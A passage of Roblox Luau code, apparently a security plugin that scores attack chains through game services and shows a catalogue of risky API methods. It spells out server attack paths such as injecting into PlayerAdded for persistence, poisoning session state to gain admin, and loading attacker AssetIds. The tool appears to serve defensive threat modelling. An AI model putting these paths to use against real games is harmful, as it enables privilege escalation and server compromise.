                        "HttpService: static URL (" .. iv:sub(1,30) .. ") -- egress controlled but response must not be eval'd.",
                        "MEDIUM")
                else
                    httpDynamic = true
                    addReason(28,
                        "HttpService: dynamic/unset URL -- data exfiltration path open. C2 channel possible.",
                        "HIGH")
                end
            else
                addReason(-8,
                    "HttpService: domain allowlisted, response not executed. Egress controlled.",
                    "LOW")
            end
        -- -- HPDC node scoring --------------------------------------------
        elseif id == "INGRESS" then
            if not sec then
                addReason(28,
                    "Ingress unsecured -- centralised framework accepts arbitrary action "
                    .. "keys without a per-action schema. Single attack surface covers entire game.",
                    "HIGH")
            else
                addReason(-12,
                    "Ingress: action-type allowlist enforced. Unknown action keys rejected at the boundary.",
                    "LOW")
            end

        elseif id == "SERIAL" then
            local act = node.selectedAction and node.selectedAction.n or ""
            if not sec then
                if act == "JSON Deserialization" or act == "Mixed-Type Array"
                or act == "Dynamic Key Routing" then
                    addReason(22,
                        "Deserializer [" .. act .. "] processes client data without depth/type limits. "
                        .. "Deeply nested payloads bypass shallow sanitisation.",
                        "HIGH")
                else
                    addReason(14,
                        "Serialization pattern [" .. act .. "] lacks schema enforcement. "
                        .. "Type coercion or dynamic routing creates manipulation vectors.",
                        "MEDIUM")
                end
            else
                addReason(-8,
                    "Serializer: schema-validated before deserialization. "
                    .. "Depth limits and type assertions enforced.",
                    "LOW")
            end

        elseif id == "INTERSERVICE" then
            if not sec then
                addReason(20,
                    "Lateral transport unsecured -- session cache written with unvalidated data. "
                    .. "Secondary systems (combat, economy, matchmaker) read it as server-authoritative.",
                    "HIGH")
            else
                addReason(-8,
                    "Cache writes tagged with origin provenance. "
                    .. "Secondary systems re-validate before acting on cached values.",
                    "LOW")
            end

        elseif id == "REFLECT" then
            hasExecutionSink = true
            local act = node.selectedAction and node.selectedAction.n or ""
            if not sec then
                if act == "Instance.new(cache string)"
                or act == "Script in Unmonitored Container" then
                    addReason(32,
                        "Reflection sink [" .. act .. "] -- cache-sourced string passed to Instance.new(). "
                        .. "Attacker can instantiate Script objects in unmonitored containers.",
                        "CRITICAL")
                elseif act == "Config Attribute Rewrite" then
                    addReason(26,
                        "Config attribute rewritten from session cache -- "
                        .. "security guards, rate limiters, or permission tiers modified by attacker.",
                        "HIGH")
                else
                    addReason(18,
                        "Reflection via [" .. act .. "] -- cache string used as property key or factory input. "
                        .. "Arbitrary server object mutation possible.",
                        "HIGH")
                end
            else
                addReason(-14,
                    "Reflection inputs hardcoded server-side. "
                    .. "Cache strings never reach Instance.new, property setters, or JSON decoders.",
                    "LOW")
            end

        elseif id == "LRCE" then
            hasEgressSink = true
            local act = node.selectedAction and node.selectedAction.n or ""
            if not sec then
                if act == "Admin Flag Injection" or act == "Authorization Check Disable" then
                    addReason(35,
                        "LRCE via [" .. act .. "] -- "
                        .. "server routing table or auth check reads from poisoned session state. "
                        .. "Operator achieves developer-level access through native game remotes.",
                        "CRITICAL")
                elseif act == "Persistent State Override" then
                    addReason(30,
                        "Persistent state override -- corrupted session flushed to DataStore. "
                        .. "Privilege escalation survives server restart. Attack chain need not repeat.",
                        "CRITICAL")
                else
                    addReason(24,
                        "Logical execution via [" .. act .. "] -- "
                        .. "server logic operates on attacker-controlled state as authoritative.",
                        "HIGH")
                end
            else
                addReason(-14,
                    "Authorisation state derived from immutable server sources only. "
                    .. "Session cache never used as a permission input.",
                    "LOW")
            end

        end
    end

    -- -- Path-level pattern bonuses ----------------------------------------
    if remoteUnsecured and bindableUnsecured and requireDynamic then
        addReason(15,
            "CRITICAL PATTERN: Remote->Bindable->require(dynamic). Classic trust-laundering chain to execution sink.",
            "CRITICAL")
    end

    if messagingUnsecured and hasExecutionSink then
        addReason(10,
            "Fleet amplification reaches execution sink -- every server in the game executes attacker payload.",
            "CRITICAL")
    end

    if remoteUnsecured and httpDynamic then
        addReason(8,
            "Unvalidated client data reaches HttpService egress -- full C2 channel: exfil + receive instructions.",
            "HIGH")
    end

    -- -- HPDC-specific path bonuses ----------------------------------------
    -- Check whether HPDC node types are present and form the critical pattern
    local hasIngress, hasSerial, hasLateral, hasReflect, hasLRCE = false,false,false,false,false
    local reflectUnsecured, lrceUnsecured = false, false
    for _, node in ipairs(order) do
        local id, sec = node.typeData.id, node.secured
        if id == "INGRESS"      then hasIngress  = true end
        if id == "SERIAL"       then hasSerial   = true end
        if id == "INTERSERVICE" then hasLateral  = true end
        if id == "REFLECT"      then hasReflect  = true if not sec then reflectUnsecured = true end end
        if id == "LRCE"         then hasLRCE     = true if not sec then lrceUnsecured    = true end end
    end

    if hasIngress and hasSerial and reflectUnsecured then
        addReason(16,
            "HPDC CRITICAL PATH: Ingress->Serializer->Reflection sink. "
            .. "No require() needed -- the game's own Instance factory is the execution primitive.",
            "CRITICAL")
    end

    if hasLateral and reflectUnsecured and lrceUnsecured then
        addReason(14,
            "HPDC FULL CHAIN: session cache poisoned at Step 3, "
            .. "reflection sink reached at Step 4, logical execution achieved at Step 5. "
            .. "No network egress required -- attack is entirely internal.",
            "CRITICAL")
    end

    if hasLRCE and lrceUnsecured then
        addReason(10,
            "Logical RCE achieved: server authorisation state derives from attacker-controlled cache. "
            .. "Native admin remotes become the delivery mechanism.",
            "CRITICAL")
    end

    -- -- Control relief ----------------------------------------------------
    if controlsCount > 0 then
        local relief = math.min(controlsCount * 8, 40)
        addReason(-relief,
            controlsCount .. " control" .. (controlsCount>1 and "s" or "") ..
            " enforced in chain. Each secured node breaks the transitive trust assumption.",
            "LOW")
    end

    -- -- Final score + tier ------------------------------------------------
    local score = math.max(0, math.min(100, rawScore))
    local tier, tierCol, tierBg
    if score >= 70 then
        tier="HIGH"
        tierCol=GC.ERR
        tierBg=Color3.fromRGB(80,16,18)
    elseif score >= 35 then
        tier="MEDIUM"
        tierCol=GC.WARN
        tierBg=Color3.fromRGB(70,45,10)
    else
        tier="LOW"
        tierCol=GC.CHK
        tierBg=Color3.fromRGB(10,55,28)
    end

    return {
        score    = score,
        tier     = tier,
        tierCol  = tierCol,
        tierBg   = tierBg,
        reasons  = reasons,
        breakdown = {
            remoteUnsecured   = remoteUnsecured,
            bindableUnsecured = bindableUnsecured,
            messagingUnsecured= messagingUnsecured,
            requireDynamic    = requireDynamic,
            requireStatic     = requireStatic,
            httpDynamic       = httpDynamic,
            hasExecutionSink  = hasExecutionSink,
            hasEgressSink     = hasEgressSink,
            controlsCount     = controlsCount,
        },
    }
end

-- Called by refreshWires() and after any state change to keep the badge live.
local function updateRiskBadge()
    if not riskBadgeLbl then return end
    local r = scoreChain()
    riskBadgeLbl.Text       = r.score .. "  " .. r.tier
    riskBadgeLbl.TextColor3 = r.tierCol
    -- Also update the badge background parent if accessible
    local bg = riskBadgeLbl.Parent
    if bg and bg:IsA("Frame") and r.tierBg then
        bg.BackgroundColor3 = r.tierBg
    end
end

-- Refresh all wire positions + trust colouring (called after any change)
local function refreshWires()
    local hotSet = computeHotSet()

    -- Recolour each node by state: secured (green lock) / hot (red) / idle
    for _, n in ipairs(graphNodes) do
        local roleAcc = ROLE_ACC[n.typeData.role]
        if n.secured then
            -- Secured: green accent + lock shown
            if n.accentStripe then n.accentStripe.BackgroundColor3 = GC.WIRE_ACT end
            if n.lockGlyph then n.lockGlyph.TextTransparency = 0 end
            if n.stateGlow then n.stateGlow.Color = GC.WIRE_ACT n.stateGlow.Transparency = 0.55 end
        elseif hotSet[n] then
            -- Hot: red accent, no lock
            if n.accentStripe then n.accentStripe.BackgroundColor3 = GC.ERR end
            if n.lockGlyph then n.lockGlyph.TextTransparency = 1 end
            if n.stateGlow then n.stateGlow.Color = GC.ERR n.stateGlow.Transparency = 0.45 end
        else
            -- Cold / safe (unreached): role accent, no lock
            if n.accentStripe then n.accentStripe.BackgroundColor3 = roleAcc end
            if n.lockGlyph then n.lockGlyph.TextTransparency = 1 end
            if n.stateGlow then n.stateGlow.Color = roleAcc n.stateGlow.Transparency = 0.80 end
        end
    end

    -- Recolour wires: a wire is HOT if its source node is hot (poison flows
    -- out of it). If the source is secured or cold, the wire is SAFE.
    for _, w in ipairs(graphWires) do
        local p1 = getPortPos(w.from, true)
        local p2 = getPortPos(w.to,   false)
        drawWireLine(w.frame, p1, p2)

        local col, trans
        if hotSet[w.from] then
            -- attacker flow is leaving this node un-checked
            col, trans = GC.ERR, 0.10
        elseif w.from.secured then
            -- the control here severs the chain: downstream is safe
            col, trans = GC.WIRE_ACT, 0.08
        else
            -- cold / not reached by any flow
            col, trans = GC.WIRE, 0.40
        end
        w.frame.BackgroundColor3 = col
        w.frame.BackgroundTransparency = trans
        local gw = w.frame:FindFirstChildOfClass("UIStroke")
        if gw then gw.Color = col end
    end

    -- Live risk score update whenever the graph state changes
    updateRiskBadge()
end

-- Close the context menu
local function closeCtx()
    if ctxMenu then ctxMenu:Destroy() ctxMenu=nil end
    closeServiceDetail()
    ctxNode = nil
end

-- Deselect current node (fade brackets out)
local function deselectNode()
    if selectedNode and selectedNode.brackets then
        for _, b in ipairs(selectedNode.brackets) do
            TweenService:Create(b, TweenInfo.new(0.12), { BackgroundTransparency = 1 }):Play()
        end
    end
    selectedNode = nil
end

-- Select a node (fade brackets in)
local function selectNode(node)
    deselectNode()
    selectedNode = node
    if node.brackets then
        for _, b in ipairs(node.brackets) do
            TweenService:Create(b, TweenInfo.new(0.12), { BackgroundTransparency = 0.0 }):Play()
        end
    end
end

-- -- Service Detail Panel -------------------------------------------------------
-- Appears to the right of the context menu when a SERVICE node row is clicked.
-- Shows security-relevant methods for the selected service, their risk level,
-- and lets the user pick a specific operation to track in the chain.

-- closeServiceDetail and ctxDetail are forward-declared near ctxMenu above.
-- Assign the function body here so closeCtx (defined between the two) can call it.
closeServiceDetail = function()
    if ctxDetail then ctxDetail:Destroy() ctxDetail = nil end
end

-- Per-service security method catalogue.
-- Each entry: { m = "MethodName", risk = "HIGH"|"MED"|"LOW", d = "what it does" }
local SERVICE_DETAILS = {
    Workspace = {
        desc = "Physical world container. Parts with client Network Ownership can be teleported by the client and replicate to the server.",
        methods = {
            { m = "FindFirstChild",     risk = "LOW", d = "Enumerate world objects." },
            { m = "GetDescendants",     risk = "LOW", d = "Full subtree scan." },
            { m = ":Touched event",     risk = "HIGH", d = "Fired by client-owned physics. Position not verified." },
            { m = "SetNetworkOwner",    risk = "HIGH", d = "Assigns physics authority. Attacker can locally teleport parts." },
            { m = "GetNetworkOwner",    risk = "MED",  d = "Read physics authority. Useful for ownership mapping." },
        },
    },
    Players = {
        desc = "Player instances, join/leave events. Identity spoofing targets this service via UserId substitution.",
        methods = {
            { m = "GetPlayerByUserId",  risk = "MED",  d = "Lookup by ID. If ID is client-supplied: identity spoof vector." },
            { m = "FindFirstChild",     risk = "MED",  d = "Find player by Name. Client-supplied name = spoof vector." },
            { m = "PlayerAdded",        risk = "HIGH", d = "Persistent hook. RCE payload target -- inject here for persistence." },
            { m = "GetPlayers",         risk = "LOW",  d = "Enumerate active players." },
            { m = "LocalPlayer",        risk = "LOW",  d = "Client-only. Cannot be accessed server-side." },
        },
    },
    ReplicatedStorage = {
        desc = "Shared storage visible to all clients. Common staging area for RemoteEvents and ModuleScripts.",
        methods = {
            { m = "FindFirstChild",     risk = "LOW",  d = "Locate a Remote or Module." },
            { m = "WaitForChild",       risk = "MED",  d = "Yields until object exists. Race window if name is client-supplied." },
            { m = "RemoteEvent:Fire",   risk = "HIGH", d = "Cross-boundary trigger. Primary attack surface." },
            { m = "RemoteFunction:Invoke", risk="HIGH",d = "Bidirectional call. Server blocks on client response -- DoS risk." },
        },
    },
    ServerStorage = {
        desc = "Server-only storage. Should never be reachable by the client. Presence of a Remote here is a critical misconfiguration.",
        methods = {
            { m = "FindFirstChild",     risk = "HIGH", d = "If accessible from client: server-only boundary broken." },
            { m = "GetDescendants",     risk = "HIGH", d = "Full server asset enumeration if accessible." },
            { m = ":ChildAdded event",  risk = "MED",  d = "Monitor for runtime asset injection." },
        },
    },
    ServerScriptService = {
        desc = "Container for server Scripts. Client should never reach this. If accessible it means sandbox escaping has occurred.",
        methods = {
            { m = "FindFirstChild",     risk = "HIGH", d = "Script enumeration. Critical if client-reachable." },
            { m = "GetDescendants",     risk = "HIGH", d = "Full server script listing -- extreme information leak." },
        },
    },
    MessagingService = {
        desc = "Cross-server broadcast channel. Data arriving here is assumed trusted by receiving servers. Fleet-wide poisoning vector.",
        methods = {
            { m = "PublishAsync",       risk = "HIGH", d = "Broadcast to all servers. If client influences payload: fleet-wide RCE." },
            { m = "SubscribeAsync",     risk = "HIGH", d = "Receiving handler. If it feeds loadstring/DataStore without re-validation: critical sink." },
        },
    },
    DataStoreService = {
        desc = "Persistent key-value storage. Writing attacker-controlled data here achieves persistence across server restarts.",
        methods = {
            { m = "GetDataStore",       risk = "MED",  d = "Open a named store. Name could be client-influenced." },
            { m = "SetAsync",           risk = "HIGH", d = "Write persistent data. If payload is client-controlled: persistent RCE state." },
            { m = "GetAsync",           risk = "MED",  d = "Read persistent data. If result is eval'd: deserialization sink." },
            { m = "UpdateAsync",        risk = "HIGH", d = "Atomic read-modify-write. Race condition if not guarded." },
            { m = "RemoveAsync",        risk = "MED",  d = "Delete a key. If key is client-supplied: data destruction." },
        },
    },
    MemoryStoreService = {
        desc = "Fast temporary cross-server memory. Lower persistence than DataStore but higher throughput. Poisoning propagates fleet-wide instantly.",
        methods = {
            { m = "GetSortedMap",       risk = "MED",  d = "Open a sorted map store." },
            { m = "SetAsync",           risk = "HIGH", d = "Fast cross-server write. Client-influenced data propagates instantly." },
            { m = "GetAsync",           risk = "MED",  d = "Read fast store. If result is eval'd: deserialization sink." },
        },
    },
    HttpService = {
        desc = "External HTTP requests. If a client can influence the URL or body, data exfiltration or SSRF becomes possible.",
        methods = {
            { m = "GetAsync",           risk = "HIGH", d = "Outbound GET. If URL is client-supplied: SSRF / data exfil." },
            { m = "PostAsync",          risk = "HIGH", d = "Outbound POST. If body is client-supplied: data exfil / webhook abuse." },
            { m = "RequestAsync",       risk = "HIGH", d = "Full HTTP control. Most dangerous if client-influenced." },
            { m = "JSONDecode",         risk = "MED",  d = "Parse JSON. Malformed input can crash or produce unexpected types." },
        },
    },
    MarketplaceService = {
        desc = "Purchases and game passes. Economy manipulation target. If purchase verification is client-side, items can be obtained without payment.",
        methods = {
            { m = "PromptPurchase",     risk = "MED",  d = "Trigger purchase UI. Client-callable. Cannot grant items alone." },
            { m = "UserOwnsGamePassAsync", risk="HIGH", d = "Verify game pass ownership. If result trusted without server check: bypass." },
            { m = "ProcessReceipt",     risk = "HIGH", d = "Server purchase callback. Duplicate processing = item duplication." },
        },
    },
    TeleportService = {
        desc = "Player teleportation. If destination is client-supplied, players can be sent to arbitrary places or servers.",
        methods = {
            { m = "Teleport",           risk = "HIGH", d = "Teleport to PlaceId. If ID is client-supplied: arbitrary place redirect." },
            { m = "TeleportToPrivateServer", risk="HIGH", d = "Private server teleport. Abuse for session isolation attacks." },
            { m = "TeleportPartyAsync", risk = "MED",  d = "Group teleport. Potential for mass redirect abuse." },
        },
    },
    InsertService = {
        desc = "Runtime asset insertion. Loading an attacker-controlled AssetId is equivalent to remote code execution.",
        methods = {
            { m = "LoadAsset",          risk = "HIGH", d = "Load asset by ID. Client-supplied AssetId = arbitrary asset injection." },
            { m = "LoadAssetVersion",   risk = "HIGH", d = "Load specific version. Same risk as LoadAsset." },
        },
    },
}

-- Fallback entry for services without a catalogue entry
local SERVICE_DETAIL_DEFAULT = {
    desc = "No detailed security catalogue available for this service. Review its API for methods that accept client-influenced arguments.",
    methods = {
        { m = "Review API manually", risk = "MED", d = "Check for methods that accept strings, numbers, or tables from client sources." },
    },
}

-- Risk colours
local RISK_COL = {
    HIGH = Color3.fromRGB(228, 60,  80),
    MED  = Color3.fromRGB(220, 175, 50),
    LOW  = Color3.fromRGB( 90, 180, 255),
}

local function openServiceDetailPanel(serviceName, anchorMenu, canvas)
    closeServiceDetail()
    if not anchorMenu or not canvas then return end

    local detail   = SERVICE_DETAILS[serviceName] or SERVICE_DETAIL_DEFAULT
    local methods  = detail.methods
    local ROW_H    = 36
    local HDR_H    = 54
    local DET_W    = 230
    local MAX_VIS  = 6
    local visRows  = math.min(#methods, MAX_VIS)
    local rowAreaH = visRows * ROW_H
    local totalH   = HDR_H + rowAreaH + 6

    -- Use Size.X.Offset (declared size) not AbsoluteSize (0 on newly-created frames)
    local menuX = anchorMenu.Position.X.Offset
    local menuW = anchorMenu.Size.X.Offset
    local menuY = anchorMenu.Position.Y.Offset

    local canvW = canvas.AbsoluteSize.X > 0 and canvas.AbsoluteSize.X or 800
    local canvH = canvas.AbsoluteSize.Y > 0 and canvas.AbsoluteSize.Y or 600

    local ax = menuX + menuW + 8
    local ay = menuY
    ax = math.min(ax, canvW - DET_W - 4)
    ay = math.min(ay, canvH - totalH - 4)
    ax = math.max(ax, 2)
    ay = math.max(ay, 2)

    -- Panel shell parented to canvas at ZIndex 60 (above ctxMenu at 40)
    local panel = Instance.new("Frame")
    panel.Name                   = "ServiceDetailPanel"
    panel.Size                   = UDim2.fromOffset(DET_W, totalH)
    panel.Position               = UDim2.fromOffset(ax, ay)
    panel.BackgroundColor3       = Color3.fromRGB(10, 12, 22)
    panel.BackgroundTransparency = 0.08
    panel.BorderSizePixel        = 0
    panel.ZIndex                 = 60
    panel.ClipsDescendants       = true
    panel.Parent                 = canvas
    ctxDetail = panel

    local BORDER = Color3.fromRGB(80, 110, 200)
    local TEXT   = Color3.fromRGB(220, 228, 248)
    local DIM    = Color3.fromRGB(110, 125, 165)

    local panCorner = Instance.new("UICorner")
    panCorner.CornerRadius = UDim.new(0, 8)
    panCorner.Parent = panel

    local panStroke = Instance.new("UIStroke")
    panStroke.Color = BORDER
    panStroke.Transparency = 0.30
    panStroke.Thickness = 1
    panStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    panStroke.Parent = panel

    -- Connector bridge (outside panel so it isn't clipped)
    local bridge = Instance.new("Frame")
    bridge.Size               = UDim2.fromOffset(10, 2)
    bridge.Position           = UDim2.fromOffset(menuX + menuW, menuY + 22)
    bridge.BackgroundColor3   = BORDER
    bridge.BackgroundTransparency = 0.50
    bridge.BorderSizePixel    = 0
    bridge.ZIndex             = 59
    bridge.Parent             = canvas

    -- Header
    local hdr = Instance.new("Frame")
    hdr.Size                   = UDim2.fromOffset(DET_W, HDR_H)
    hdr.Position               = UDim2.fromOffset(0, 0)
    hdr.BackgroundColor3       = Color3.fromRGB(14, 18, 34)
    hdr.BackgroundTransparency = 0.08
    hdr.BorderSizePixel        = 0
    hdr.ZIndex                 = 61
    hdr.Parent                 = panel

    local hdrCorner = Instance.new("UICorner")
    hdrCorner.CornerRadius = UDim.new(0, 8)
    hdrCorner.Parent = hdr

    -- Accent stripe
    local stripe = Instance.new("Frame")
    stripe.Size               = UDim2.fromOffset(3, HDR_H)
    stripe.Position           = UDim2.fromOffset(0, 0)
    stripe.BackgroundColor3   = BORDER
    stripe.BackgroundTransparency = 0.0
    stripe.BorderSizePixel    = 0
    stripe.ZIndex             = 62
    stripe.Parent             = hdr

    local stripeCorner = Instance.new("UICorner")
    stripeCorner.CornerRadius = UDim.new(0, 2)
    stripeCorner.Parent = stripe

    -- Service name label
    local nameL = Instance.new("TextLabel")
    nameL.Size                   = UDim2.fromOffset(DET_W - 30, 18)
    nameL.Position               = UDim2.fromOffset(10, 3)
    nameL.BackgroundTransparency = 1
    nameL.Text                   = serviceName
    nameL.TextSize               = 10
    nameL.Font                   = Enum.Font.GothamBold
    nameL.TextColor3             = TEXT
    nameL.TextXAlignment         = Enum.TextXAlignment.Left
    nameL.TextYAlignment         = Enum.TextYAlignment.Center
    nameL.BorderSizePixel        = 0
    nameL.ZIndex                 = 62
    nameL.Parent                 = hdr

    -- Close button
    local closeF = Instance.new("Frame")
    closeF.Size               = UDim2.fromOffset(14, 14)
    closeF.Position           = UDim2.fromOffset(DET_W - 20, 5)
    closeF.BackgroundColor3   = Color3.fromRGB(180, 40, 40)
    closeF.BackgroundTransparency = 0.50
    closeF.BorderSizePixel    = 0
    closeF.ZIndex             = 62
    closeF.Parent             = hdr

    local closeFCorner = Instance.new("UICorner")
    closeFCorner.CornerRadius = UDim.new(0, 3)
    closeFCorner.Parent = closeF

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size                   = UDim2.fromOffset(14, 14)
    closeBtn.Position               = UDim2.fromOffset(0, 0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text                   = "x"
    closeBtn.TextSize               = 8
    closeBtn.Font                   = Enum.Font.GothamBold
    closeBtn.TextColor3             = TEXT
    closeBtn.ZIndex                 = 63
    closeBtn.Parent                 = closeF
    closeBtn.MouseButton1Click:Connect(function()
        bridge:Destroy()
        closeServiceDetail()
    end)

    -- Description
    local descL = Instance.new("TextLabel")
    descL.Size                   = UDim2.fromOffset(DET_W - 14, HDR_H - 22)
    descL.Position               = UDim2.fromOffset(8, 22)
    descL.BackgroundTransparency = 1
    descL.Text                   = detail.desc:sub(1, 110)
    descL.TextSize               = 7
    descL.Font                   = Enum.Font.Gotham
    descL.TextColor3             = DIM
    descL.TextWrapped            = true
    descL.TextXAlignment         = Enum.TextXAlignment.Left
    descL.TextYAlignment         = Enum.TextYAlignment.Top
    descL.BorderSizePixel        = 0
    descL.ZIndex                 = 62
    descL.Parent                 = hdr

    -- Divider
    local div = Instance.new("Frame")
    div.Size               = UDim2.fromOffset(DET_W, 1)
    div.Position           = UDim2.fromOffset(0, HDR_H)
    div.BackgroundColor3   = BORDER
    div.BackgroundTransparency = 0.60
    div.BorderSizePixel    = 0
    div.ZIndex             = 61
    div.Parent             = panel

    -- Methods scroll
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size                       = UDim2.fromOffset(DET_W, rowAreaH)
    scroll.Position                   = UDim2.fromOffset(0, HDR_H + 1)
    scroll.BackgroundTransparency     = 1
    scroll.BorderSizePixel            = 0
    scroll.ScrollBarThickness         = (#methods > MAX_VIS) and 3 or 0
    scroll.ScrollBarImageColor3       = BORDER
    scroll.ScrollBarImageTransparency = 0.40
    scroll.CanvasSize                 = UDim2.fromOffset(0, #methods * ROW_H)
    scroll.ZIndex                     = 61
    scroll.Parent                     = panel

    local ll = Instance.new("UIListLayout")
    ll.SortOrder = Enum.SortOrder.LayoutOrder
    ll.Padding   = UDim.new(0, 1)
    ll.Parent    = scroll

    for i, m in ipairs(methods) do
        local riskCol = RISK_COL[m.risk] or DIM
        local BZ = 62

        local row = Instance.new("Frame")
        row.Size                   = UDim2.fromOffset(DET_W, ROW_H)
        row.BackgroundColor3       = Color3.fromRGB(16, 20, 36)
        row.BackgroundTransparency = 0.45
        row.BorderSizePixel        = 0
        row.LayoutOrder            = i
        row.ZIndex                 = BZ
        row.Parent                 = scroll

        local rstripe = Instance.new("Frame")
        rstripe.Size               = UDim2.fromOffset(3, ROW_H)
        rstripe.BackgroundColor3   = riskCol
        rstripe.BackgroundTransparency = 0.25
        rstripe.BorderSizePixel    = 0
        rstripe.ZIndex             = BZ + 1
        rstripe.Parent             = row

        local badge = Instance.new("Frame")
        badge.Size               = UDim2.fromOffset(30, 13)
        badge.Position           = UDim2.fromOffset(7, 5)
        badge.BackgroundColor3   = riskCol
        badge.BackgroundTransparency = 0.62
        badge.BorderSizePixel    = 0
        badge.ZIndex             = BZ + 1
        badge.Parent             = row

        local badgeC = Instance.new("UICorner")
        badgeC.CornerRadius = UDim.new(0, 3)
        badgeC.Parent = badge

        local badgeLbl = Instance.new("TextLabel")
        badgeLbl.Size                   = UDim2.fromOffset(30, 13)
        badgeLbl.BackgroundTransparency = 1
        badgeLbl.Text                   = m.risk
        badgeLbl.TextSize               = 6
        badgeLbl.Font                   = Enum.Font.GothamBold
        badgeLbl.TextColor3             = riskCol
        badgeLbl.TextXAlignment         = Enum.TextXAlignment.Center
        badgeLbl.BorderSizePixel        = 0
        badgeLbl.ZIndex                 = BZ + 2
        badgeLbl.Parent                 = badge

        local mLbl = Instance.new("TextLabel")
        mLbl.Size                   = UDim2.fromOffset(DET_W - 50, 14)
        mLbl.Position               = UDim2.fromOffset(42, 3)
        mLbl.BackgroundTransparency = 1
        mLbl.Text                   = m.m
        mLbl.TextSize               = 8
        mLbl.Font                   = Enum.Font.GothamBold
        mLbl.TextColor3             = TEXT
        mLbl.TextXAlignment         = Enum.TextXAlignment.Left
        mLbl.TextTruncate           = Enum.TextTruncate.AtEnd
        mLbl.BorderSizePixel        = 0
        mLbl.ZIndex                 = BZ + 1
        mLbl.Parent                 = row

        local dLbl = Instance.new("TextLabel")
        dLbl.Size                   = UDim2.fromOffset(DET_W - 12, ROW_H - 19)
        dLbl.Position               = UDim2.fromOffset(7, 19)
        dLbl.BackgroundTransparency = 1
        dLbl.Text                   = m.d:sub(1, 80)
        dLbl.TextSize               = 7
        dLbl.Font                   = Enum.Font.Gotham
        dLbl.TextColor3             = DIM
        dLbl.TextWrapped            = true
        dLbl.TextXAlignment         = Enum.TextXAlignment.Left
        dLbl.TextYAlignment         = Enum.TextYAlignment.Top
        dLbl.BorderSizePixel        = 0
        dLbl.ZIndex                 = BZ + 1
        dLbl.Parent                 = row

        row.MouseEnter:Connect(function()
            TweenService:Create(row, TweenInfo.new(0.08),
                {BackgroundTransparency=0.18}):Play()
        end)
        row.MouseLeave:Connect(function()
            TweenService:Create(row, TweenInfo.new(0.08),
                {BackgroundTransparency=0.45}):Play()
        end)
    end
end

-- -- Context menu (imGUI) ---------------------------------------------------
local function openCtxMenu(node, canvasPos)
    closeCtx()
    ctxNode = node

    local acc    = ROLE_ACC[node.typeData.role]
    local acts   = node.typeData.actions
    local ctrl   = node.typeData.control
    local nodeId = node.typeData.id

    -- -- Layout constants ------------------------------------------
    local CTX_W      = 210
    local ROW_H      = 22   -- height of each option row
    local HDR_H      = 38   -- title header
    local SCAN_LBL_H = 13   -- "FOUND IN GAME" sub-header (scan nodes only)
    local MAX_ROWS   = 7    -- max visible rows before scroll kicks in
    local IB_H       = 36   -- input-box band height (label + box)
    local CTRL_H     = 52   -- DEFENSE band
    local FOOT_H     = 28   -- footer
    local SEP        = 1    -- divider thickness

    -- -- Mode detection --------------------------------------------
    local useLiveScan   = (nodeId == "REMOTE" or nodeId == "BINDABLE")
    local usePlayerScan = (nodeId == "SERVICE" and
        node.selectedAction and node.selectedAction.n == "Players")
    local useInputBox   = (nodeId == "INPUT"   or nodeId == "REQUIRE"
                        or nodeId == "HTTP"    or nodeId == "INGRESS"
                        or nodeId == "SERIAL")  -- HPDC nodes with configurable values
    local isService     = (nodeId == "SERVICE")

    -- -- Live scan -------------------------------------------------
    local scanResults = nil
    if useLiveScan then
        scanResults = (nodeId == "REMOTE") and scanRemotes() or scanBindables()
    elseif usePlayerScan then
        scanResults = scanPlayers()
    end
    local rowSource  = scanResults or acts
    local rowCount   = #rowSource
    local visRows    = math.min(rowCount, MAX_ROWS)  -- how many rows are visible

    -- -- Precise height calculation using a running cursor ---------
    -- Each section adds its own height to curH. Nothing is hardcoded twice.
    local rowAreaH   = visRows * ROW_H   -- visible row area (clipped by scroll)
    local scanLblH   = (scanResults ~= nil) and SCAN_LBL_H or 0
    local ibH        = useInputBox and (IB_H + SEP) or 0

    local totalH = HDR_H + SEP
        + scanLblH + (scanLblH > 0 and SEP or 0)
        + rowAreaH + SEP
        + ibH
        + CTRL_H + SEP
        + FOOT_H

    -- -- Canvas-clamped position -----------------------------------
    -- Use visible menu height (capped at MAX_ROWS) for vertical clamping,
    -- not the total scrollable canvas height. A 30-row service list would
    -- otherwise push cy below the canvas floor and snap the whole menu up.
    local visibleMenuH = HDR_H + SEP
        + scanLblH + (scanLblH > 0 and SEP or 0)
        + rowAreaH + SEP   -- rowAreaH already capped at MAX_ROWS * ROW_H
        + ibH
        + CTRL_H + SEP
        + FOOT_H
    local cx = math.min(canvasPos.X, graphCanvas.AbsoluteSize.X - CTX_W - 4)
    local cy = math.min(canvasPos.Y, graphCanvas.AbsoluteSize.Y - visibleMenuH - 4)
    cx = math.max(cx, 2)
    cy = math.max(cy, 2)

    -- -- Menu shell ------------------------------------------------
    local menu = Instance.new("Frame")
    menu.Name                   = "CtxMenu"
    menu.Size                   = UDim2.fromOffset(CTX_W, totalH)
    menu.Position               = UDim2.fromOffset(cx, cy)
    menu.BackgroundColor3       = GC.CTX_TOP
    menu.BackgroundTransparency = 0.28
    menu.BorderSizePixel        = 0
    menu.ZIndex                 = 40
    menu.ClipsDescendants       = true
    menu.Parent                 = graphCanvas
    mC(menu, 7)
    mGrad(menu, GC.CTX_TOP, GC.CTX_BOT, 90)
    mS(menu, acc, 0.25, 1)
    mGlow(menu, acc, 0.65, 3)
    ctxMenu = menu

    -- Running Y cursor -- every section advances this
    local curY = 0

    -- -- SECTION: Header -------------------------------------------
    local hdr = mF(menu, 0, curY, CTX_W, HDR_H, GC.CTX_TOP, 0.35, 41)
    hdr.Size = UDim2.new(1, 0, 0, HDR_H)
    mC(hdr, 7)
    mGrad(hdr, GC.CTX_TOP, GC.CTX_BOT, 90)
    -- square-off header bottom corners
    mF(hdr, 0, HDR_H-6, CTX_W, 6, GC.CTX_BOT, 0.38, 41).Size = UDim2.new(1,0,0,6)
    -- accent stripe
    local cstripe = mF(hdr, 0, 0, 2, HDR_H, acc, 0.0, 42)
    mGlow(cstripe, acc, 0.50, 2)
    -- accent underline
    mF(menu, 2, HDR_H-1, CTX_W-2, 1, acc, 0.50, 42).Size = UDim2.new(1,-2,0,1)
    -- title
    mL(hdr, 10, 4, CTX_W-38, 14, node.typeData.label,
        Enum.Font.GothamBold, 10, acc, Enum.TextXAlignment.Left, 42)
    -- subtitle: selected action or hint
    mL(hdr, 10, 20, CTX_W-16, 13,
        node.selectedAction and node.selectedAction.n or "No action selected",
